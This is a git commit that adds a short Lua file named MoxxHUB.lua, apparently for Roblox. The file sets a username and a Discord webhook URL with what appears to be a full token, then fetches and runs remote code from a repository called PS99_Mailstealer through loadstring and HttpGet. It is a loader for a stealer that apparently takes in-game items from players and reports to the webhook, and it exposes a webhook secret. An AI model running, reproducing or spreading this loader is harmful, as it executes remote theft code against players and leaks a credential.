0e13e949fa282f2c9e915f14c3eba9632ec90377
MoxxHub <miroshaki.010822@gmail.com>
2024-06-22 15:45:23 +0200

    Add files via upload

---
+++ MoxxHUB.lua
@@ -0,0 +1,5 @@
+Username = "MoxxuL9393"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1254064961982828636/AnD4BgHkl47JtoLdwuL_e1BxWcc2TktQS53fkvlri1wPiacx3KluC_kCFsjvoNGxFs7E" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
